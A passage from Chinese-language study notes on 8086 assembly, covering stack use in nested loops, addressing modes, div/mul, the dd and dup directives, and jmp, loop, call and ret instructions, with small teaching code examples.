&#x27;dec.............&#x27;</span><br><span class="line">db &#x27;dos.............&#x27;</span><br><span class="line">db &#x27;vax.............&#x27;</span><br><span class="line">dw 0;定义一个字，用来暂存cx</span><br><span class="line">datasg ends</span><br><span class="line">codesg segment</span><br><span class="line">start:mov ax,datasg</span><br><span class="line">mov ds,ax</span><br><span class="line">mov bx,0</span><br><span class="line">mov cx,4</span><br><span class="line">s0: mov ds:[40h],cx;将外层循环的cx值保存在datasg:40h单元中</span><br><span class="line">mov si,0</span><br><span class="line"></span><br><span class="line">mov cx,3;cx设置为内层循环的次数</span><br><span class="line">s:mov al,[bx+si]</span><br><span class="line">and al,11011111b</span><br><span class="line">mov [bx+si],al</span><br><span class="line">inc si</span><br><span class="line">loop s</span><br><span class="line"></span><br><span class="line">add bx,16</span><br><span class="line">mov cx,ds:[40h];用datasg:40h单元中的值恢复cx</span><br><span class="line">loop s0</span><br><span class="line"></span><br><span class="line">mov ax,4c00h</span><br><span class="line">int 21h</span><br><span class="line">codesg ends</span><br><span class="line">end start</span><br></pre></td></tr></table></figure><p>如果需要保存多个数据，需要记住哪个数据暂存在哪个单元中，这样程序容易混乱。一般来说，在需要暂存数据的时候，我们都应该使用栈。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">assume cs:codesg,ds:datasg,ss:stacksg</span><br><span class="line">datasg segment</span><br><span class="line">db &#x27;ibm.............&#x27;</span><br><span class="line">db &#x27;dec.............&#x27;</span><br><span class="line">db &#x27;dos.............&#x27;</span><br><span class="line">db &#x27;vax.............&#x27;</span><br><span class="line">datasg ends</span><br><span class="line">stacksg segment</span><br><span class="line">dw 0,0,0,0,0,0,0,0</span><br><span class="line">stacksg ends</span><br><span class="line">codesg segment</span><br><span class="line">start:mov ax,stacksg</span><br><span class="line">mov ss,ax</span><br><span class="line">mov sp,16</span><br><span class="line">mov ax,datasg</span><br><span class="line">mov ds,ax</span><br><span class="line">mov bx,0</span><br><span class="line">mov cx,4</span><br><span class="line">s0: push cx;将外层循环的cx值压栈</span><br><span class="line">mov si,0</span><br><span class="line"></span><br><span class="line">mov cx,3;cx设置为内层循环的次数</span><br><span class="line">s:mov al,[bx+si]</span><br><span class="line">and al,11011111b</span><br><span class="line">mov [bx+si],al</span><br><span class="line">inc si</span><br><span class="line">loop s</span><br><span class="line"></span><br><span class="line">add bx,16</span><br><span class="line">pop cx;从栈顶弹出原cx的值恢复cx</span><br><span class="line">loop s0</span><br><span class="line"></span><br><span class="line">mov ax,4c00h</span><br><span class="line">int 21h</span><br><span class="line">codesg ends</span><br><span class="line">end start</span><br></pre></td></tr></table></figure><h1 id="8-数据处理"><a href="#8-数据处理" class="headerlink" title="8. 数据处理"></a>8. 数据处理</h1><p>reg表示一个寄存器，sreg表示一个段寄存器。</p><p>reg有ax, bx, cx, dx, ah, al, bh, bl, ch, cl, dh, dl, sp, bp, si, di</p><p>sreg有ds, ss, cs, es</p><h2 id="8-1-bx-si-di和bp"><a href="#8-1-bx-si-di和bp" class="headerlink" title="8.1 bx, si, di和bp"></a>8.1 bx, si, di和bp</h2><ol><li>在8086CPU中又有这4个寄存器可以在“[]”中进行内存单元寻址</li><li>在“[]”中，这4个寄存器可以单个出现，或只能以4种组合出现：bx和si, bx和di, bp和si, bp和di</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mov ax,[bx]</span><br><span class="line">mov ax,[bx+si]</span><br><span class="line">mov ax,[bp+di]</span><br></pre></td></tr></table></figure><ol><li>只要在“[]”中使用寄存器bp，而指令中没有显性地给出段地址，段地址就默认在ss中</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mov ax,[bp](ax)=((ss)*16+(bp))</span><br><span class="line">mov ax,[bp+si+idata](ax)=((ss)*16+(bp)+(si)+idata)</span><br></pre></td></tr></table></figure><h2 id="8-2-数据的位置"><a href="#8-2-数据的位置" class="headerlink" title="8.2 数据的位置"></a>8.2 数据的位置</h2><p>指令在执行前，所要处理的数据可以在3个地方：CPU内部、内存、端口。</p><div class="table-container"><table><thead><tr><th>汇编指令</th><th>指令执行前数据的位置</th></tr></thead><tbody><tr><td>mov bx,[0]</td><td>内存，ds:0单元</td></tr><tr><td>mov bx,ax</td><td>CPU内部，ax寄存器</td></tr><tr><td>mov bx,1</td><td>CPU内部，指令缓冲器</td></tr></tbody></table></div><h3 id="8-2-1-数据位置的表达"><a href="#8-2-1-数据位置的表达" class="headerlink" title="8.2.1 数据位置的表达"></a>8.2.1 数据位置的表达</h3><ol><li>立即数(idata)</li><li>寄存器</li><li>段地址(SA)和偏移地址(EA)</li></ol><h3 id="8-2-2-寻址方式"><a href="#8-2-2-寻址方式" class="headerlink" title="8.2.2 寻址方式"></a>8.2.2 寻址方式</h3><img src="/posts/de6e58e0/%E5%AF%BB%E5%9D%80%E6%96%B9%E5%BC%8F%E5%B0%8F%E7%BB%93.png" class="" title="寻址方式"><h2 id="8-3-数据的长度"><a href="#8-3-数据的长度" class="headerlink" title="8.3 数据的长度"></a>8.3 数据的长度</h2><p>8086CPU可以处理两种尺寸的数据，byte和word。</p><ol><li>通过寄存器名指明要处理的数据的尺寸</li><li>在没有寄存器名存在的情况下，用操作符X ptr指明内存单元的长度，X在汇编指令中可以为word或byte</li></ol><p>例如下面的指令中，用word ptr指明了指令访问的内存单元是一个字单元</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mov word ptr ds:[0],1</span><br><span class="line">inc word ptr [bx]</span><br></pre></td></tr></table></figure><p>下面的指令中，用byte ptr指明了指令访问的内存单元是一个字节单元</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mov byte ptr ds:[0],1</span><br><span class="line">add byte ptr [bx],2</span><br></pre></td></tr></table></figure><ol><li>其他方法</li></ol><p>有些指令默认了访问的是字单元还是字节单元，比如push [1000H]就不用指明访问的是字单元还是字节单元。因为push指令只进行字操作。</p><h2 id="8-4-div指令"><a href="#8-4-div指令" class="headerlink" title="8.4 div指令"></a>8.4 div指令</h2><p>div是除法指令，使用div做除法时应注意以下问题</p><ol><li>除数：有8位和16位两种，在一个reg或内存单元中。</li><li>被除数：默认放在AX  或  DX和AX中，如果除数为8位，被除数则为16位，默认在AX中存放；如果除数16位，被除数则为32位，在DX和AX中存放，DX存放高16位，AX存放低16位。</li><li>结果：如果除数为8位，则AL存储除法操作的商，AH存储除法操作的余数；如果除数为16位，则AX存储除法操作的商，DX存储除法操作的余数。</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">div reg</span><br><span class="line">div 内存单元</span><br><span class="line"></span><br><span class="line">div byte ptr ds:[0]</span><br><span class="line">含义:(al)=(ax)/((ds)*16+0)的商</span><br><span class="line">(ah)=(ax)/((ds)*16+0)的余数</span><br><span class="line"></span><br><span class="line">div word ptr es:[0]</span><br><span class="line">含义:(ax)=[(dx)*10000H+(ax)]/((es)*16+0)的商</span><br><span class="line">(dx)=[(dx)*10000H+(ax)]/((es)*16+0)的余数</span><br></pre></td></tr></table></figure><p>编程，利用除法指令计算100001/100</p><p>被除数100001大于65535，不能用ax寄存器存放，所以只能用dx和ax两个寄存器联合存放100001，也就是说要进行16位的除法。除数100小于255，可以在一个8位寄存器中存放，但是因为被除数是32位的，除数应为16位，所以要用一个16位寄存器来存放除数100。</p><p>因为要分别为dx和ax赋100001的高16位值和低16位值，所以应先将100001表示为16进制形式：186A1H</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mov dx,1</span><br><span class="line">mov ax,86a1h;(dx)*10000H+(ax)=100001h</span><br><span class="line">mov bx,100</span><br><span class="line">div bx</span><br></pre></td></tr></table></figure><p>程序执行后，(ax)=03E8H(即1000)，(dx)=1(余数为1)</p><h2 id="8-5-伪指令dd"><a href="#8-5-伪指令dd" class="headerlink" title="8.5 伪指令dd"></a>8.5 伪指令dd</h2><p>dd(double word)双字型数据</p><p>用div计算data段中第一个数据除以第二个数据后的结果，商存在第三个数据的存储单元中。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">data segment</span><br><span class="line">dd 100001</span><br><span class="line">dw 100</span><br><span class="line">dw 0</span><br><span class="line">data ends</span><br><span class="line">code segment</span><br><span class="line">mov ax,data</span><br><span class="line">mov ds,ax</span><br><span class="line">mov ax,ds:[0];ds:[0]字单元中的低16位存储在ax中</span><br><span class="line">mov dx,ds:[2];ds:[2]字单元中的高16位存储在dx中</span><br><span class="line">div word ptr ds:[4];用dx:ax中的32位数据除以ds:[4]字单元中的数据</span><br><span class="line">mov ds:[6],ax;将商存储在ds:[6]字单元中</span><br><span class="line">code ends</span><br></pre></td></tr></table></figure><h2 id="8-6-dup"><a href="#8-6-dup" class="headerlink" title="8.6 dup"></a>8.6 dup</h2><p>dup是一个操作符，在汇编语言中同db, dw, dd等一样，也是由编译器识别处理的符号。它是和db, dw, dd等数据定义伪指令配合使用，用来进行数据的重复。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">db 3 dup (0);定义了3个字节,它们的值都是0,相当于db 0,0,0</span><br><span class="line">db 3 dup (0,1,2);db 0,1,2,0,1,2,0,1,2</span><br><span class="line">db 3 dup (&#x27;abc&#x27;,&#x27;ABC&#x27;)</span><br></pre></td></tr></table></figure><p>dup使用格式</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">db 重复的次数 dup (重复的字节型数据)</span><br><span class="line">dw 重复的次数 dup (重复的字型数据)</span><br><span class="line">dd 重复的次数 dup (重复的双字型数据)</span><br></pre></td></tr></table></figure><h1 id="9-转移指令的原理"><a href="#9-转移指令的原理" class="headerlink" title="9. 转移指令的原理"></a>9. 转移指令的原理</h1><p>可以修改IP，或同时修改CS和IP的指令统称为转移指令。转移指令就是可以控制CPU执行内存中某处代码的指令。</p><p>8086CPU的转移行为有以下几类</p><ul><li>只修改IP时，称为段内转移，比如：jmp ax</li><li>同时修改CS和IP时，称为段间转移，比如：jmp 1000:0</li></ul><p>由于转移指令对IP的修改范围不同，段内转移又分为短转移和近转移</p><ul><li>短转移IP的修改范围为-128~127</li><li>近转移IP的修改范围为-32768~32767</li></ul><p>8086CPU的转移指令分为以下几类</p><ul><li>无条件转移指令(jmp)</li><li>条件转移指令</li><li>循环指令(loop)</li><li>过程</li><li>中断</li></ul><h2 id="9-1-操作符offset"><a href="#9-1-操作符offset" class="headerlink" title="9.1 操作符offset"></a>9.1 操作符offset</h2><p>操作符offset在汇编语言中是由编译器处理的符号，它的功能是取得标号的偏移地址。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">assume cs:codesg</span><br><span class="line">codesg segment</span><br><span class="line">start:mov ax,offset start;相当于mov ax,0(指令长度为3字节)</span><br><span class="line">s:mov ax,offset s;相当于mov ax,3</span><br><span class="line">codesg ends</span><br><span class="line">end start</span><br></pre></td></tr></table></figure><p>程序在运行中将s处的一条指令复制到s0处</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">assume cd:codesg</span><br><span class="line">codesg segment</span><br><span class="line">s:mov ax,bx;mov ax,bx的机器码占两个字节</span><br><span class="line">mov si,offset s</span><br><span class="line">mov di,offset s0</span><br><span class="line">mov ax,cs:[si]</span><br><span class="line">mov cs:[di],ax</span><br><span class="line">s0:nop;nop机器码占一个字节</span><br><span class="line">nop</span><br><span class="line">codesg ends</span><br><span class="line">end s</span><br></pre></td></tr></table></figure><h2 id="9-2-jmp指令"><a href="#9-2-jmp指令" class="headerlink" title="9.2 jmp指令"></a>9.2 jmp指令</h2><p>jmp为无条件转移指令，可以指修改IP，也可以同时修改CS和IP。</p><p>jmp指令要给出两种信息：</p><ol><li>转移的目的地址</li><li>转移的距离(段间转移、段内短转移、段内近转移)</li></ol><h3 id="9-2-1-依据位移进行转移的jmp指令"><a href="#9-2-1-依据位移进行转移的jmp指令" class="headerlink" title="9.2.1 依据位移进行转移的jmp指令"></a>9.2.1 依据位移进行转移的jmp指令</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jmp short 标号(转到标号处执行指令)：(IP)=(IP)+8位位移</span><br></pre></td></tr></table></figure><p>这种格式的jmp指令实现的是段内短转移，它对IP的修改范围为-128~127，向前转移时最多可以越过128个字节，向后转移最多可以越过127个字节。</p><p>CPU在执行jmp指令的时候并不需要转移的目的地址。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">assume cs:codesg</span><br><span class="line">codesg segment</span><br><span class="line">start:mov ax,0</span><br><span class="line">jmp short s</span><br><span class="line">add ax,1</span><br><span class="line">s:inc ax</span><br><span class="line">codesg ends</span><br><span class="line">end start</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jmp near ptr 标号：(IP)=(IP)+16位位移</span><br></pre></td></tr></table></figure><p>这种格式的jmp指令实现的是段内近转移，它对IP的修改范围为-32768~32767，向前转移时最多可以越过32768个字节，向后转移最多可以越过32767个字节。</p><h3 id="9-2-2-转移的目的地址在指令中的jmp指令"><a href="#9-2-2-转移的目的地址在指令中的jmp指令" class="headerlink" title="9.2.2 转移的目的地址在指令中的jmp指令"></a>9.2.2 转移的目的地址在指令中的jmp指令</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jmp far ptr 标号：(CS)=标号所在段的段地址；(IP)=标号在段中的偏移地址</span><br></pre></td></tr></table></figure><p>这种格式的jmp指令实现的是段间转移，又称远转移。far ptr指明了指令用标号的段地址和偏移地址修改CS和IP。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">assume cs:codesg</span><br><span class="line">codesg segment</span><br><span class="line">start:mov ax,0</span><br><span class="line">mov bx,0</span><br><span class="line">jmp far ptr s</span><br><span class="line">db 256 dup (0)</span><br><span class="line">s:add ax,1</span><br><span class="line">inc ax</span><br><span class="line">codesg ends</span><br><span class="line">end start</span><br></pre></td></tr></table></figure><h3 id="9-2-3-转移地址在寄存器中的-jmp指令"><a href="#9-2-3-转移地址在寄存器中的-jmp指令" class="headerlink" title="9.2.3 转移地址在寄存器中的 jmp指令"></a>9.2.3 转移地址在寄存器中的 jmp指令</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jmp 16位reg：(IP)=(16位reg)</span><br></pre></td></tr></table></figure><h3 id="9-2-4-转移地址在内存中的jmp指令"><a href="#9-2-4-转移地址在内存中的jmp指令" class="headerlink" title="9.2.4 转移地址在内存中的jmp指令"></a>9.2.4 转移地址在内存中的jmp指令</h3><p>转移地址在内存中的jmp指令有两种格式：</p><ol><li>jmp word ptr 内存单元地址(段内转移)</li></ol><p>功能：从内存单元地址处开始存放着一个字，是转移的目的偏移地址。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mov ax,0123h</span><br><span class="line">mov ds:[0],ax</span><br><span class="line">jmp word ptr ds:[0]</span><br></pre></td></tr></table></figure><p>执行后，(IP)=0123H</p><ol><li>jmp dword ptr 内存单元地址(段间转移)</li></ol><p>功能：从内存单元地址处开始存放着两个字，高地址处的字是转移的目的段地址，低地址处是转移的目的偏移地址。</p><p>(CS)=(内存单元地址+2)，(IP)=(内存单元地址)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mov ax,0123h</span><br><span class="line">mov ds:[0],ax</span><br><span class="line">mov word ptr ds:[2],0</span><br><span class="line">jmp dword ptr ds:[0]</span><br></pre></td></tr></table></figure><p>执行后，(CS)=0，(IP)=0123h，CS:IP指向0000:0123</p><h2 id="9-3-jcxz指令"><a href="#9-3-jcxz指令" class="headerlink" title="9.3 jcxz指令"></a>9.3 jcxz指令</h2><p>jcxz指令为有条件转移指令，所有的有条件转移指令都是短转移，在对应的机器码中包含转移的位移，而不是目的地址。对IP的修改范围都为-128~127</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">jcxz 标号(如果(cx)=0,转移到标号处执行)：当(cx)=0时，(IP)=(IP)+8位位移</span><br><span class="line">if((cx)==0) jmp short 标号;</span><br></pre></td></tr></table></figure><h2 id="9-4-loop指令"><a href="#9-4-loop指令" class="headerlink" title="9.4 loop指令"></a>9.4 loop指令</h2><p>loop指令是循环指令，所有的循环指令都是短转移，在对应的机器码中包含转移的位移，而不是目的地址。对IP的修改范围都为-128~127</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">loop 标号((cx)=(cx)-1,如果(cx)≠0，转移到标号处执行)：如果(cx)≠0,(IP)=(IP)+8位位移</span><br><span class="line">(cx)--;</span><br><span class="line">if((cx)!=0) jmp short 标号;</span><br></pre></td></tr></table></figure><h1 id="10-call和ret指令"><a href="#10-call和ret指令" class="headerlink" title="10. call和ret指令"></a>10. call和ret指令</h1><p>call和ret指令都是转移指令，他们都修改IP，或同时修改CS和IP。它们经常被共同用来实现子程序的设计。</p><h2 id="10-1-ret和retf"><a href="#10-1-ret和retf" class="headerlink" title="10.1 ret和retf"></a>10.1 ret和retf</h2><p>ret指令用栈中的数据，修改IP的内容，从而实现近转移；retf指令用栈中的数据，修改CS和IP的内容，从而实现远转移。</p><h3 id="10-1-1-ret指令"><a href="#10-1-1-ret指令" class="headerlink" title="10.1.1 ret指令"></a>10.1.1 ret指令</h3><p>CPU执行ret指令时，进行下面2步操作：</p><ol><li>(IP)=((SS)*16+(SP))</li><li>(SP)=(SP)+2</li></ol><p>CPU执行ret指令时相当于进行：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pop IP</span><br></pre></td></tr></table></figure><h3 id="10-1-2-retf指令"><a href="#10-1-2-retf指令" class="headerlink" title="10.1.2 retf指令"></a>10.1.2 retf指令</h3><p>CPU执行retf指令时，进行下面4步操作：</p><ol><li>(IP)=((SS)*16+(SP))</li><li>(SP)=(SP)+2</li><li>(CS)=((SS)*16+(SP))</li><li>(SP)=(SP)+2</li></ol><p>CPU执行retf指令时相当于进行：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pop IP</span><br><span class="line">pop CS</span><br></pre></td></tr></table></figure><h2 id="10-2-call指令"><a href="#10-2-call指令" class="headerlink" title="10.2 call指令"></a>10.2 call指令</h2><p>CPU执行call指令时，进行2步操作：</p><ol><li>将当前的IP或CS和IP压入栈中</li><li>转移</li></ol><p>call指令不能实现短转移，除此之外，call指令实现转移的方法和jmp指令的原理相同。</p><h3 id="10-2-1-依据位移进行转移的call指令"><a href="#10-2-1-依据位移进行转移的call指令" class="headerlink" title="10.2.1 依据位移进行转移的call指令"></a>10.2.1 依据位移进行转移的call指令</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">call 标号(将当前的IP压栈后，转到标号处执行指令)</span><br></pre></td></tr></table></figure><p>CPU执行此种格式的call指令时，进行如下操作：</p><ol><li>(sp)=(sp)-2<br>((ss)*16+(sp))=(IP)</li><li>(IP)=(IP)+16位位移</li></ol><p>CPU执行“call 标号“时，相当于进行：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">push IP</span><br><span class="line">jmp near ptr 标号</span><br></pre></td></tr></table></figure><h3 id="10-2-2-转移的目的地址在指令中的call指令"><a href="#10-2-2-转移的目的地址在指令中的call指令" class="headerlink" title="10.2.2 转移的目的地址在指令中的call指令"></a>10.2.2 转移的目的地址在指令中的call指令</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">call far ptr 标号</span><br></pre></td></tr></table></figure><p>实现的是段间转移。</p><p>CPU执行此种格式的call指令时，进行如下操作：</p><ol><li><p>(sp)=(sp)-2</p><p>((ss)*16+(sp))=(CS)</p><p>(sp)=(sp)-2</p><p>((ss)*16+(sp))=(IP)</p></li><li><p>(CS)=标号所在段的段地址</p><p>(IP)=标号在段中的偏移地址</p></li></ol><p>CPU执行“call far ptr 标号“时，相当于进行：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">push CS</span><br><span class="line">push IP</span><br><span class="line">jmp far ptr 标号</span><br></pre></td></tr></table></figure><h3 id="10-2-3-转移地址在寄存器中的call指令"><a href="#10-2-3-转移地址在寄存器中的call指令" class="headerlink" title="10.2.3 转移地址在寄存器中的call指令"></a>10.2.3 转移地址在寄存器中的call指令</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">call 16位reg</span><br></pre></td></tr></table></figure><p>CPU执行此种格式的call指令时，进行如下操作：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">(sp)=(sp)-2</span><br><span class="line">((ss)*16+(sp))=(IP)</span><br><span class="line">(IP)=(16位reg)</span><br></pre></td></tr></table></figure><p>CPU执行“call 16位reg“时，相当于进行：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">push IP</span><br><span class="line">jmp 16位reg</span><br></pre></td></tr></table></figure><h3 id="10-2-4-转移地址在内存中的call指令"><a href="#10-2-4-转移地址在内存中的call指令" class="headerlink" title="10.2.4 转移地址在内存中的call指令"></a>10.2.4 转移地址在内存中的call指令</h3><p>转移地址在内存中的call指令有两种格式：</p><ol><li>call word ptr 内存单元地址</li></ol><p>CPU执行“call word ptr 内存单元地址“时，相当于进行：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">push IP</span><br><span class="line">jmp word ptr 内存单元地址</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mov sp,10h</span><br><span class="line">mov ax,0123h</span><br><span class="line">mov ds:[0],ax</span><br><span class="line">call word ptr ds:[0]</span><br></pre></td></tr></table></figure><p>执行后，(IP)=0123h，(sp)=0EH</p><ol><li>call dword ptr 内存单元地址</li></ol><p>CPU执行“call dword ptr 内存单元地址“时，相当于进行：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">push CS</span><br><span class="line">push IP</span><br><span class="line">jmp dword ptr 内存单元地址</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">mov sp,10h</span><br><span class="line">mov ax,0123h</span><br><span class="line">mov ds:[0],ax</span><br><span class="line">mov word ptr ds:[2],0</span><br><span class="line">call dword ptr ds:[0]</span><br></pre></td></tr></table></figure><p>执行后，(CS)=0，(IP)=0123H，(sp)=0CH</p><h2 id="10-3-call和ret的配合使用"><a href="#10-3-call和ret的配合使用" class="headerlink" title="10.3 call和ret的配合使用"></a>10.3 call和ret的配合使用</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">assume cd:code</span><br><span class="line">code segment</span><br><span class="line">start:mov ax,1</span><br><span class="line">mov cx,3</span><br><span class="line">call s</span><br><span class="line">mov bx,ax;(bx)=8</span><br><span class="line">mov ax,4c00h</span><br><span class="line">int 21h</span><br><span class="line">s:add ax,ax</span><br><span class="line">loop s</span><br><span class="line">ret</span><br><span class="line">code ends</span><br><span class="line">end start</span><br></pre></td></tr></table></figure><h2 id="10-4-mul指令"><a href="#10-4-mul指令" class="headerlink" title="10.4 mul指令"></a>10.4 mul指令</h2><p>mul指令是乘法指令，使用mul做乘法时要注意两点：</p><ol><li>两个相乘的数：要么都是8位，要么都是16位。如果是8位，一个默认放在AL中，另一个放在8位reg或内存字节单元中；如果是16位，一个默认放在AX中，另一个放在16位reg或内存字单元中</li><li>结果：如果是8位乘法，结果默认放在AX中；如果是16位乘法，结果高位默认在DX中存放，低位在AX中存放</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">mul reg</span><br><span class="line">mul 内存单元</span><br><span class="line"></span><br><span class="line">mul byte ptr ds:[0]</span><br><span class="line">含义：(ax)=(al)*((ds)*16+0)</span><br><span class="line"></span><br><span class="line">mul word ptr [bx+si+8]</span><br><span class="line">含义：(ax)=(ax)*((ds)*16+(bx)+(si)+8)结果的低16位</span><br><span class="line"> (dx)=(ax)*((ds)*16+(bx)+(si)+8)结果的高16位</span><br></pre></td></tr></table></figure><p>计算100*10。(100和10小于255，可以做8位乘法)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mov al,100</span><br><span class="line">mov bl,10</span><br><span class="line">mul bl</span><br></pre></td></tr></table></figure><p>结果：(ax)=1000(03E8H)</p><p>计算100*10000。(100小于255，但10000大于255，所以必须做16位乘法)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mov ax,100</span><br><span class="line">mov bx,10000</span><br><span class="line">mul bx</span><br></pre></td></tr></table></figure><p>结果：(ax)=4240h，(dx)=000FH（F4240H=1000000）</p><h1 id="11-标志寄存器"><a href="#11-标志寄存器" class="headerlink" title="11. 